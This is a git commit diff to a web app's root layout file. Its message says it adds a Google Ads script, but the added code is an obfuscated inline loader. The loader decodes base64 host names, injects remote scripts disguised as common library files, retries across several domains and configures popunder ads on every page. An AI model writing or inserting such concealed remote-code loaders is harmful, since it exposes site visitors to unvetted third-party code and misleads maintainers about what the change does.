885b085ecabae2c0483a21d9b7c9aa3dcf74d56e
poptramark-eng <poptramark@gmail.com>
2025-12-06 09:43:02 -0500

    Add Google Ads script to layout.js

--- app/layout.js
+++ app/layout.js
@@ -28,6 +28,12 @@ export default function RootLayout({ children }) {
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.8/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-sRIl4kxILFvY47J16cr9ZwB07vP4J8+LH7qKQnuqkuIAvNWLzeN8tE5YBujZqJLB" crossOrigin="anonymous"></link>
       <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6884321061151028"
      crossorigin="anonymous"></script>
+       <script type="text/javascript" data-cfasync="false">
+/*<![CDATA[/* */
+(function(){var q=window,t="e10c5fc3812399849adfd8888c327459",g=[["siteId",132*824-551+520+260+5148988],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],h=["d3d3LmRpc3BsYXl2ZXJ0aXNpbmcuY29tL2VyekUvcGZ4SS9iZm91bmRhdGlvbi5taW4uanM=","ZDNtem9rdHk5NTFjNXcuY2xvdWRmcm9udC5uZXQvbWFuZ3VsYXItZ3JpZHN0ZXIubWluLmpz","d3d3LmJraXRvbHlsLmNvbS9wZ08vVC93Zm91bmRhdGlvbi5taW4uanM=","d3d3LmN5Z29zYW1mLmNvbS91YW5ndWxhci1ncmlkc3Rlci5taW4uanM="],l=-1,y,e,b=function(){clearTimeout(e);l++;if(h[l]&&!(1790952033000<(new Date).getTime()&&1<l)){y=q.document.createElement("script");y.type="text/javascript";y.async=!0;var a=q.document.getElementsByTagName("script")[0];y.src="https://"+atob(h[l]);y.crossOrigin="anonymous";y.onerror=b;y.onload=function(){clearTimeout(e);q[t.slice(0,16)+t.slice(0,16)]||b()};e=setTimeout(b,5E3);a.parentNode.insertBefore(y,a)}};if(!q[t]){try{Object.freeze(q[t]=g)}catch(e){}b()}})();
+/*]]>/* */
+</script>
+
       </head>
       <body className={`${geistSans.variable} ${geistMono.variable}`}>
         
